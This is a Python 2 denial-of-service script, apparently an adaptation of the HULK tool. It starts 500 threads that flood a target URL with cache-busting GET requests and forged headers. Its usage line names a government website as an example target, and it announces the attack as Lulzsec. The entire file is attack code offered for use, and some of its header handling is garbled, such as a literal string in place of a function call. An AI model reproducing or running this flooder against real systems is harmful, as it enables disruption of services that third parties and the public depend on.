
import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('null\r\n')
	headers_useragents.append('null\r\n')
	
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('null\r\n')
	headers_referers.append('null\r\n')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'USAGE: TestDDos.py <url> (ex. TestDDos.py http://www.gov.ph)'
	print 'you can add "safe" after url, to autoshut after dos'
	print '---------------------------------------------------'
acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    ]

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'null\r\n')
	request.add_header('Accept-Charset', 'Choice(acceptall) + "\r\n"')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'null\r\n')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'Flood request sent'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print "Work Done!"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "[+] Lulzsec started an attack [+]"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('https\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
